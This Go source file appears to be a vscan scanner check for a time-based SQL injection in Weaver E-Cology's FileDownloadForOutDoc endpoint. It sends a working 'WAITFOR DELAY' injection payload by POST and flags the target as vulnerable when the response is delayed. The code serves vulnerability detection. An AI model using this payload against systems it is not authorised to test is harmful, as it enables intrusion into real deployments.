package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"math/rand"
	"time"
)

func E_Cology_filedownloadforoutdoc_sql(u string) bool {
	rand.Seed(time.Now().UnixNano())

	// 定义字符集
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	// 生成随机字符串
	result := make([]byte, 10)
	for i := 0; i < 10; i++ {
		result[i] = charset[rand.Intn(len(charset))]
	}

	//fmt.Println(string(result))

	payload := "fileid=" + string(result) + "+WAITFOR DELAY+'0:0:5'&isFromOutImg=1"
	start := time.Now()

	if req, err := pkg.HttpRequset(u+"/weaver/weaver.file.FileDownloadForOutDoc", "POST", payload, false, nil); err == nil {
		//pkg.GoPocLog(req.Body)
		elapsed := time.Since(start)

		if req.StatusCode == 200 && elapsed > 5*time.Second {
			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_filedownloadforoutdoc_sql注入漏洞|%s\n", u+"/weaver/weaver.file.FileDownloadForOutDoc"))
			return true
		}
	}
	return false

}
